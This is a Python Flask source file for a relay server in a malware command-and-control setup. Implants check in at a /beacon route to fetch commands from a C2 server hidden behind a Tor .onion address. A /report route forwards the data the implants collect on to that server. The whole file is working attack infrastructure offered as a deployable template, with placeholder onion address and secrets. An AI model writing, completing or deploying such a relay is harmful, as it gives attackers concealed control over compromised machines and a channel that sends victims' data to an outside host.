
import time
import logging
import hashlib
import json
from flask import Flask, request, jsonify
import requests

# The .onion address of your C2 server (behind Tor)
C2_ONION_URL = "http://YOUR_ONION_ADDRESS.onion"

# Auth token that the C2 server expects
AUTH_TOKEN = "CHANGE_ME_TO_A_STRONG_SECRET"

# Tor SOCKS5 proxy (default Tor config)
TOR_PROXY = {
    "http":  "socks5h://127.0.0.1:9050",
    "https": "socks5h://127.0.0.1:9050"
}

# Relay listen config
RELAY_HOST = "0.0.0.0"
RELAY_PORT = 8443

# Simple relay auth — agents must send this token to prove they're legit
RELAY_AUTH_TOKEN = "CHANGE_ME_RELAY_SECRET"

# Request timeout for Tor connections
TOR_TIMEOUT = 30

app = Flask(__name__)

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(levelname)s - %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)
logger = logging.getLogger("relay")


def verify_relay_auth():
    """Check the agent's relay auth token."""
    token = request.headers.get("X-Relay-Token", "")
    if token != RELAY_AUTH_TOKEN:
        return False
    return True


def forward_to_c2(method, endpoint, params=None, json_body=None):
    url = f"{C2_ONION_URL}/{endpoint}"
    headers = {
        "X-Auth-Token": AUTH_TOKEN,
        "Content-Type": "application/json"
    }

    try:
        if method == "GET":
            resp = requests.get(
                url,
                headers=headers,
                params=params,
                proxies=TOR_PROXY,
                timeout=TOR_TIMEOUT
            )
        elif method == "POST":
            resp = requests.post(
                url,
                headers=headers,
                json=json_body,
                proxies=TOR_PROXY,
                timeout=TOR_TIMEOUT
            )
        else:
            return {"status": "error", "message": "Unsupported method"}, 400

        return resp.json(), resp.status_code

    except requests.exceptions.ConnectionError:
        logger.error(f"Connection to C2 failed (is Tor running?)")
        return {"status": "error", "message": "C2 unreachable"}, 502
    except requests.exceptions.Timeout:
        logger.error(f"Request to C2 timed out")
        return {"status": "error", "message": "C2 timeout"}, 504
    except Exception as e:
        logger.error(f"Relay error: {str(e)}")
        return {"status": "error", "message": "Relay internal error"}, 500


@app.route("/beacon", methods=["GET"])
def beacon():

    if not verify_relay_auth():
        return jsonify({"status": "error", "message": "Unauthorized"}), 403

    agent_id = request.args.get("agent_id", "default")
    logger.info(f"[BEACON] Agent check-in: {agent_id}")

    result, status_code = forward_to_c2(
        "GET",
        "getcommand.php",
        params={"agent_id": agent_id}
    )

    return jsonify(result), status_code


@app.route("/report", methods=["POST"])
def report():

    if not verify_relay_auth():
        return jsonify({"status": "error", "message": "Unauthorized"}), 403

    data = request.get_json(silent=True)
    if not data:
        return jsonify({"status": "error", "message": "Invalid JSON"}), 400

    agent_id = data.get("agent_id", "unknown")
    logger.info(f"[REPORT] Data from agent: {agent_id}")

    result, status_code = forward_to_c2(
        "POST",
        "postdata.php",
        json_body=data
    )

    return jsonify(result), status_code


@app.route("/health", methods=["GET"])
def health():
    """Simple health check (no auth required)."""
    return jsonify({"status": "ok", "time": time.strftime("%Y-%m-%d %H:%M:%S")}), 200


# ══════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════

if __name__ == "__main__":
    logger.info(f"=== Relay Server starting on {RELAY_HOST}:{RELAY_PORT} ===")
    logger.info(f"=== Forwarding to C2: {C2_ONION_URL} ===")
    app.run(
        host=RELAY_HOST,
        port=RELAY_PORT,
        debug=False,
        threaded=True
    )
